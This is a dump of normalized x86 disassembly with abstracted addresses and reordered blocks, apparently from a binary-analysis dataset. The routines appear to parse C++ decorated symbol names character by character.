mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] edi
test bl bl
jne r-xdata
sub_414dd4
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi 0xfffffeff
push ebx
mov [ esi + 0x4 ] bl
mov eax [ esi + 0x4 ]
and eax edi
mov [ esi ] ebx
and eax 0xffff01ff
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_41609f
mov ecx eax
add esp 0xc
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
test al al
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
jne r-xdata
mov cl [ eax ]
cmp cl 0x40
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
test cl cl
je r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
cmp cl 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
mov eax [ esi + 0x4 ]
and eax edi
mov [ esi ] ebx
and eax 0xffff01ff
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] 0x2
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4149f6
pop ecx
mov ecx eax
call sub_410e91
mov ecx eax
call sub_410e2b
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
push esi
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41085d
mov ecx eax
call sub_410e91
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov [ esi ] ecx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
push 0x1
mov ecx esi
call sub_410bd3
jmp r-xdata
sub_414ecf
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
jne r-xdata
push 0x0
cmp cl 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41085d
jmp r-xdata
push [ ebp + 0x8 ]
call sub_4132d1
pop ecx
pop ecx
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_4132d1
push eax
push 0x2d
push [ ebp + 0x8 ]
call sub_410dbf
add esp 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_414f33
push ebp
mov ebp esp
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
push [ ebp + 0xc ]
mov esi [ eax + 0x8 ]
mov ecx esi
push [ ebp + 0x8 ]
call j_sub_40d468
mov ecx edi
call esi
pop esi
mov eax [ ebp + 0x8 ]
jmp r-xdata
pop edi
pop ebp
retn 0x8
sub_414f5f
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
cmp [ ebx ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov [ esi ] 0x0
mov edi [ ebp + 0xc ]
call sub_416363
push esi
mov ecx rw-data
lea edi [ eax + 0x1 ]
push edi
call sub_413d8f
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
lea eax [ edi - 0x1 ]
mov ecx ebx
add eax esi
push eax
push esi
call sub_414f33
mov [ eax ] 0x0
jmp r-xdata
sub_414fb5
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x4
push r--data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41510a
add esp 0x10
jmp r-xdata
pop ebp
retn 0x8
sub_415008
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
push edi
push [ ebp + 0xc ]
mov edi [ ebx + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ edi ]
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
cmp eax [ ebp + 0xc ]
jae r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi [ ebx + 0x8 ]
push [ ebp + 0xc ]
push eax
mov edx [ edi ]
mov esi [ edx + 0x8 ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
sub_415067
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_410823
mov ecx [ rw-data ]
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
jne r-xdata
push 0x2
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x5f
jne r-xdata
lea eax [ ebp - 0x10 ]
inc ecx
push 0x0
push eax
mov [ rw-data ] ecx
call sub_4132d1
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4132d1
mov eax [ rw-data ]
add esp 0x10
mov cl [ eax ]
test cl cl
je r-xdata
dec eax
mov [ rw-data ] eax
push 0x1
jmp r-xdata
cmp cl 0x40
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
inc eax
mov [ rw-data ] eax
mov cl [ eax ]
test cl cl
jne r-xdata
mov ecx [ ebp - 0x8 ]
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41510a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
sub eax edx
mov ecx [ ebp + 0x14 ]
cmp ecx eax
jle r-xdata
test ecx ecx
je r-xdata
mov ecx eax
lea eax [ edx + ecx ]
pop ebp
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi edx
sub edi edx
mov ebx ecx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ebx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
sub_415141
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_41609f
inc eax
cmp [ eax ] 0x24
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_413e7e
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_41577a
pop ecx
pop ecx
jmp r-xdata
add esp 0xc
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_415189
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov [ ebp - 0x15 ] dl
and [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
and [ edi + 0x4 ] 0xffff00ff
mov [ rw-data ] dl
cmp [ edi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
mov [ rw-data ] 0x0
pop edi
call sub_40c3ae
mov esp ebp
pop ebp
retn
push esi
mov esi [ rw-data ]
push ebx
pop ebx
pop esi
cmp al 0x40
je r-xdata
xor bl bl
test dl dl
je r-xdata
mov bl 0x1
mov [ ebp - 0x15 ] bl
jmp r-xdata
mov [ ebp - 0x44 ] esi
cmp al 0x24
jne r-xdata
push ecx
mov ecx [ rw-data ]
lea eax [ ebp - 0x74 ]
inc esi
push eax
mov [ rw-data ] esi
call sub_410c08
mov ecx eax
mov eax [ ecx ]
mov [ ebp - 0x20 ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
and [ ebp - 0x20 ] 0x0
mov edx 0xffff0000
and [ ebp - 0x1c ] edx
xor bh bh
movsx ecx al
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
mov al [ esi ]
cmp al 0x58
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp al 0x24
jne r-xdata
inc esi
mov [ rw-data ] esi
push r--data
movsx eax [ esi + 0x2 ]
sub eax 0x24
je r-xdata
cmp [ edi + 0x4 ] 0x0
mov dl [ ebp - 0x15 ]
je r-xdata
test bl bl
je r-xdata
cmp al 0x3f
jne r-xdata
inc esi
cmp [ esi ] al
je r-xdata
mov esi [ rw-data ]
mov eax esi
sub eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
cmp [ esi + 0x3 ] 0x56
jne r-xdata
sub eax 0x31
je r-xdata
mov al [ esi ]
test al al
je r-xdata
lea eax [ ebp - 0x20 ]
mov ecx edi
push eax
call sub_410ed5
test bh bh
je r-xdata
push 0x2c
mov ecx edi
call sub_410f18
and [ ebp - 0x40 ] 0x0
lea eax [ ebp - 0x40 ]
and [ ebp - 0x3c ] edx
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_4144e0
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_414ecf
test [ rw-data ] 0x4000
pop ecx
je r-xdata
lea eax [ ebp - 0x7c ]
mov [ rw-data ] esi
push eax
call sub_415436
jmp r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
add esi 0x4
add esi 0x3
mov [ rw-data ] esi
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi [ rw-data ]
push r--data
mov ecx edi
call sub_410fcd
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x50 ]
push r--data
mov [ ebp - 0x2c ] eax
call sub_410fcd
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x2c ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop ecx
mov ecx eax
mov eax [ ecx ]
mov [ ebp - 0x20 ] eax
mov eax [ ecx + 0x4 ]
lea eax [ ebp - 0x20 ]
push eax
call sub_41106e
mov esi [ rw-data ]
add esi 0x3
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x1c ] eax
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x38 ]
call sub_414f5f
lea eax [ ebp - 0x14 ]
push eax
call sub_42f290
mov esi [ rw-data ]
pop ecx
push eax
mov ecx esi
call j_sub_40d468
call esi
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
mov bh 0x1
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x5c ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x48 ]
push r--data
mov [ ebp - 0x24 ] eax
call sub_410fcd
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
jmp r-xdata
push eax
jmp r-xdata
lea ecx [ ebp - 0x20 ]
call sub_410ba1
jmp r-xdata
sub_415436
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov cl [ eax ]
inc eax
push edi
movsx edi cl
mov [ ebp - 0x81 ] cl
mov [ rw-data ] eax
cmp edi 0x4a
jg r-xdata
cmp edi 0x51
je r-xdata
cmp edi 0x46
jge r-xdata
push 0x2
cmp edi 0x52
je r-xdata
push 0x7b
lea ecx [ ebp - 0x80 ]
call sub_4107aa
mov al [ ebp - 0x81 ]
sub al 0x48
cmp al 0x2
ja r-xdata
sub edi 0x0
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_414ecf
pop ecx
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x8c ]
call sub_414f5f
lea eax [ ebp - 0x14 ]
push eax
call sub_42f290
test [ rw-data ] 0x4000
mov esi eax
pop ecx
je r-xdata
cmp edi 0x53
je r-xdata
sub edi 0x46
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_413085
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410ed5
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f18
dec eax
mov [ rw-data ] eax
sub edi 0x30
je r-xdata
and esi 0xfff
lea eax [ ebp - 0x14 ]
push esi
push r--data
push 0x10
push eax
call sub_401a50
add esp 0x10
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x80 ]
push eax
call sub_410823
sub edi 0x52
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x7c ] ecx
test ecx ecx
je r-xdata
and [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x0
and [ ebx + 0x4 ] 0xffff00ff
jmp r-xdata
jle r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414ecf
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410ed5
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f18
sub edi 0x1
je r-xdata
mov ecx ebx
call sub_41085d
push ebx
call sub_414ecf
jmp r-xdata
sub edi 0x1
je r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
jmp r-xdata
dec edi
sub edi 0x1
je r-xdata
and eax 0xfff
push eax
call j_sub_40d468
call [ ebp - 0x7c ]
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp edi 0x56
jle r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414ecf
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410ed5
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_410f18
sub edi 0x1
je r-xdata
pop ecx
jmp r-xdata
cmp [ eax ] 0x40
jne r-xdata
sub edi 0x1
je r-xdata
lea ecx [ ebp - 0x94 ]
call sub_410823
mov ecx eax
call sub_410e2b
push r--data
push ebx
lea ecx [ ebp - 0x8c ]
call sub_410e91
jmp r-xdata
sub edi 0x1
je r-xdata
push eax
jmp r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_414ecf
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_410ed5
sub edi 0x1
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
call sub_413085
pop ecx
push eax
push ebx
push r--data
lea ecx [ ebp - 0x8c ]
call sub_410823
jmp r-xdata
inc eax
mov [ rw-data ] eax
push r--data
lea eax [ ebp - 0x80 ]
push eax
call sub_414ecf
lea eax [ ebp - 0x8c ]
push eax
call sub_414ecf
cmp [ ebp - 0x7c ] 0x1
pop ecx
pop ecx
jg r-xdata
sub edi 0x13
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
jmp r-xdata
sub edi 0x1
jne r-xdata
mov ecx ebx
call sub_410823
jmp r-xdata
sub edi 0x1
jne r-xdata
mov ecx eax
call sub_410e2b
jmp r-xdata
push 0x1
jmp r-xdata
cmp [ ebp - 0x88 ] 0x1
jg r-xdata
push ebx
call sub_413085
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
push r--data
push 0x7d
push ebx
lea ecx [ ebp - 0x80 ]
call sub_410e4d
jmp r-xdata
push 0x64
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_414f5f
test eax eax
je r-xdata
mov al [ ebp - 0x77 ]
mov [ ebp - 0x78 ] al
cmp al 0x2d
jne r-xdata
mov [ ebp - 0x77 ] 0x2e
mov al [ ebp - 0x76 ]
mov [ ebp - 0x77 ] al
mov [ ebp - 0x76 ] 0x2e
jmp r-xdata
lea eax [ ebp - 0x8c ]
push eax
push ebx
push 0x65
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x94 ]
call sub_410823
mov ecx eax
call sub_410e4d
sub_41577a
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xac
cmp [ eax ] 0x3f
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1 ] 0x24
jne r-xdata
mov ecx [ rw-data ]
add eax 0x2
or [ ebp - 0x54 ] 0xffffffff
or [ ebp - 0x80 ] 0xffffffff
or [ ebp - 0xac ] 0xffffffff
push ebx
mov [ ebp - 0x10 ] ecx
xor bl bl
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x54 ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0x80 ]
push edi
mov edi [ rw-data ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0xac ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
cmp [ eax ] 0x3f
mov [ ebp - 0x1 ] bl
jne r-xdata
push 0x1
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41609f
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_413e7e
mov bl [ ebp - 0x1 ]
jmp r-xdata
test bl bl
jne r-xdata
mov [ rw-data ] 0x1
mov ecx [ eax ]
add esp 0xc
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
mov [ rw-data ] edi
mov [ rw-data ] esi
pop edi
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_415189
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x3c
lea ecx [ ebp - 0x28 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_410ed5
lea ecx [ ebp - 0xc ]
call sub_413cd0
cmp al 0x3e
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x3e
lea ecx [ ebp - 0xc ]
call sub_410f18
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x20
lea ecx [ ebp - 0xc ]
call sub_410f18
mov ecx [ ebp - 0xc ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
inc eax
mov [ rw-data ] eax
sub_4158d0
push ebp
mov ebp esp
sub esp 0x10
and [ ebp - 0x8 ] 0x0
mov eax 0xffff0000
and [ ebp - 0x4 ] eax
and [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
and [ ebp - 0x10 ] 0x0
push 0x1
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_412955
mov eax [ ebp + 0x8 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_41590a
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x18
mov cl [ eax ]
test cl cl
je r-xdata
push 0x29
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push 0x1
push eax
push r--data
lea ecx [ ebp - 0x10 ]
call sub_410823
mov ecx eax
call sub_410eb3
mov ecx eax
cmp cl 0x5a
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_41211c
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea ecx [ ebp - 0x18 ]
call sub_410823
mov ecx eax
call sub_410e2b
push 0x29
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
inc eax
mov [ rw-data ] eax
and ecx 0xffff0000
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] ecx
jmp r-xdata
call sub_410e4d
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_415994
push ebp
mov ebp esp
push ecx
mov edx [ rw-data ]
push ebx
push esi
push edi
mov esi 0x4000
mov al [ edx ]
cmp al 0x41
jl r-xdata
inc edx
mov ecx esi
mov [ rw-data ] edx
cmp al 0x24
jne r-xdata
cmp al 0x5a
jle r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
inc edx
mov [ ebp - 0x1 ] 0x0
mov [ rw-data ] edx
movsx eax [ edx ]
cmp eax 0x42
jg r-xdata
movsx ebx [ edx ]
mov eax 0x8000
sub ebx 0x41
or ecx eax
inc edx
mov [ rw-data ] edx
test bl 0x1
je r-xdata
cmp al 0x39
jne r-xdata
cmp al 0x38
jg r-xdata
sub eax 0x43
je r-xdata
je r-xdata
and ecx 0xffffdfff
or ecx 0x2000
jmp r-xdata
xor ecx ecx
test al al
setne cl
add ecx 0xfffe
inc edx
mov ecx 0xfffd
mov [ rw-data ] edx
jmp r-xdata
movsx eax al
inc edx
add eax 0xffffffd0
mov [ rw-data ] edx
and ecx 0xffff7fff
cmp eax 0x8
ja r-xdata
or ecx 0x7c00
sub eax 0x1
je r-xdata
or ecx 0x9800
jmp r-xdata
test eax eax
je r-xdata
mov eax ecx
mov esi 0xffffefff
mov edi 0x800
test eax ecx
je r-xdata
cmp ebx 0x18
jge r-xdata
mov eax 0xffff
jmp r-xdata
jmp [ eax * 4 + jump_table_415e70 ]
and ecx 0xfffff5ff
or ecx 0x9100
jmp r-xdata
sub eax 0x1
je r-xdata
inc edx
mov [ rw-data ] edx
jmp r-xdata
mov ecx 0xfffe
dec edx
jmp r-xdata
cmp eax 0x24
jne r-xdata
and ecx 0xffff9fff
and ecx esi
or ecx edi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x8000
test eax ecx
je r-xdata
mov eax 0x8000
test eax ecx
je r-xdata
mov eax 0x8000
test eax ecx
je r-xdata
and ecx 0xffffdfff
or ecx esi
jmp r-xdata
and ecx 0xffffe3ff
or ecx 0x6000
jmp r-xdata
and ecx 0xffffbfff
or ecx 0x2000
jmp r-xdata
and ecx 0xffffebff
or ecx 0x6800
jmp r-xdata
and ecx 0xfffff3ff
or ecx 0x7000
jmp r-xdata
and ecx 0xfffffbff
or ecx 0x7800
jmp r-xdata
and ecx 0xfffff6ff
or ecx 0x9200
jmp r-xdata
sub eax 0xd
jne r-xdata
cmp eax 0x2f
jle r-xdata
cmp [ edx + 0x1 ] 0x50
jne r-xdata
test eax ecx
je r-xdata
cmp edx 0x8
je r-xdata
mov edx ebx
and edx 0x18
je r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xffff9fff
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
inc edx
mov [ ebp - 0x1 ] 0x1
mov [ rw-data ] edx
mov bl [ edx ]
cmp bl 0x30
jl r-xdata
cmp eax 0x35
jle r-xdata
inc edx
mov [ rw-data ] edx
movsx eax [ edx ]
cmp eax 0x4a
jg r-xdata
inc edx
and ecx esi
or ecx edi
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
cmp edx 0x10
je r-xdata
and ecx 0xffffefff
or ecx 0x800
jmp r-xdata
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
test eax ecx
je r-xdata
xor eax eax
test bl bl
sete al
add eax 0xfffe
jmp r-xdata
cmp bl 0x35
jg r-xdata
movsx ebx [ edx ]
mov eax 0x8000
or ecx eax
sub ebx 0x30
mov esi 0xffffefff
mov edi 0x800
test eax ecx
je r-xdata
cmp eax 0x41
jne r-xdata
cmp eax 0x4c
jl r-xdata
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ebx 0x6
sub ebx 0x0
je r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffff9fff
and ecx esi
or ecx edi
jmp r-xdata
and ecx 0xfffff4ff
or ecx 0x9000
jmp r-xdata
cmp eax 0x4d
jle r-xdata
inc edx
mov [ rw-data ] edx
mov al [ edx ]
cmp al 0x30
jl r-xdata
sub eax 0x0
je r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
and ecx 0xfffffdff
or ecx 0x500
and ecx 0xfffffeff
or ecx 0x600
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
inc edx
mov [ rw-data ] edx
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov ecx 0xffff
jmp r-xdata
cmp al 0x39
jg r-xdata
mov eax 0xfffe
jmp r-xdata
sub eax 0x46
je r-xdata
and ecx 0xffff9fff
jmp r-xdata
and ecx 0xfffffaff
or ecx 0x200
jmp r-xdata
and ecx 0xfffff9ff
or ecx 0x100
jmp r-xdata
dec ebx
sub ebx 0x1
jne r-xdata
and ecx 0xffffdfff
or ecx 0x2000
jmp r-xdata
test bl 0x1
je r-xdata
xor ecx ecx
cmp [ edx ] 0x5f
jne r-xdata
cmp eax 0x51
movsx eax al
add eax 0xffffffd1
add eax edx
mov [ rw-data ] eax
call sub_415994
or eax 0x10000
jmp r-xdata
dec eax
sub eax 0x1
jmp r-xdata
and ecx 0xfffffcff
or ecx 0x400
jmp r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
je r-xdata
and ebx 0x6
sub ebx 0x0
je r-xdata
jne r-xdata
and ecx esi
or ecx edi
jmp r-xdata
and ecx 0xffffff7f
or ecx 0x40
jmp r-xdata
test eax ecx
je r-xdata
dec ebx
sub ebx 0x1
jne r-xdata
and ecx 0xfffff7ff
or ecx 0x1000
jmp r-xdata
and ecx 0xffffffbf
or ecx 0x80
jmp r-xdata
test eax ecx
je r-xdata
and ecx 0xffffe7ff
jmp r-xdata
and ecx 0xffffff3f
jmp r-xdata
sub_415e94
push ebp
mov ebp esp
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
cmp cl 0x41
mov ecx [ ebp + 0x8 ]
je r-xdata
inc eax
push r--data
mov [ rw-data ] eax
call sub_410823
jmp r-xdata
push 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
call sub_41085d
sub_415ee4
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push r--data
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov ecx esi
mov [ esi + 0x4 ] eax
call sub_410fcd
lea eax [ ebp - 0x8 ]
push eax
call sub_4149f6
pop ecx
push eax
mov ecx esi
call sub_410ed5
push 0x7d
mov ecx esi
call sub_410f18
mov ecx [ rw-data ]
cmp [ ecx ] 0x40
jne r-xdata
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
inc ecx
mov [ rw-data ] ecx
sub_415f3a
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
sub esp 0x20
mov eax [ ecx ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
inc ebx
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov cl al
mov [ esi + 0x4 ] eax
cmp cl bl
jg r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp cl bl
jg r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_412f77
mov eax [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
push 0x20
mov [ ebp - 0x4 ] eax
call sub_410f18
push esi
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e2b
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
cmp al bl
jg r-xdata
push esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
lea ecx [ ebp - 0x20 ]
call sub_41085d
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x10 ]
mov [ esi ] ecx
mov ecx [ ebp - 0xc ]
mov [ esi + 0x4 ] ecx
mov eax [ rw-data ]
cmp [ eax ] 0x40
je r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
push r--data
cmp [ eax ] 0x40
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
cmp [ esi + 0x4 ] bl
jg r-xdata
cmp cl 0x40
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_4149f6
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x60
